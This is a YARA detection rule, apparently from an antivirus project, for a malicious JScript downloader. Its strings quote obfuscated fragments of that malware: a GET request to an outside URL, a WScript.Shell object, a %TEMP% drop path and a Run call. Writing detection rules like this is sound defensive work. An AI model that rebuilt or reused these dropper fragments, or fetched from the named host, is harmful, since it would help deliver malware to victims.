rule sig_20160427_dde1fdc5193e41b6fbd58d4548d36a02 {
  meta:
    description = "datamaliciousorder - file 20160427_dde1fdc5193e41b6fbd58d4548d36a02.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4db7833fb334a59eba380d7c17c8cb64f0dc9a20125a03148562b2753be8be5b"

  strings:
    $s1  = "ZzgomHmpyy[GucjtEzecr](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function NllonWnxhh() {return AguqfRlggp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"FppJC4B" ascii
    $s3  = "function NllonWnxhh() {return AguqfRlggp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"FppJC4B" ascii
    $s4  = "function OtbpeOhxjq(XewmvGmbqc, JtvimZmghh){AfdecXtepv = AfdecXtepv * 1; return XewmvGmbqc - JtvimZmghh;};" fullword ascii
    $s5  = "var AguqfRlggp = function XaepcVwkbt() {return XynheKwstp[FsvivVylbi](\"WScript\"+\".Shell\");}(), QjpdeCptlz = 11;" fullword ascii
    $s6  = "var XynheKwstp = this[\"WScript\"];" fullword ascii
    $s7  = "function DznzwGfoud(){return UztowGtigv + \"\";};" fullword ascii
    $s8  = "if (ZzgomHmpyy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function ZrprlIpcxg() {return ((SsyscKtczg == true) && (SsyscKtczg == LuvqtDbzzb)) ? 1 : AfdecXtepv;};" fullword ascii
    $s10 = "function QmvpyErhcc(){return 23;};" fullword ascii
    $s11 = "IvqtaPakxd = true;" fullword ascii
    $s12 = "return OtbpeOhxjq(MctimXufaw, RhfleEgftq);" fullword ascii
    $s13 = "function BgzeoYenjn(UtpwsNwkgl){AguqfRlggp[\"R\"+\"un\"](UtpwsNwkgl, AfdecXtepv, AfdecXtepv);};" fullword ascii
    $s14 = "LuvqtDbzzb = true; " fullword ascii
    $s15 = "function MhewkAfvgi()" fullword ascii
    $s16 = "var LuvqtDbzzb = false;" fullword ascii
    $s17 = "function FkgogJyfor(){return FsvivVylbi;};" fullword ascii
    $s18 = "var PbogxTlatb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var SsyscKtczg = false;" fullword ascii
    $s20 = "var IvqtaPakxd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}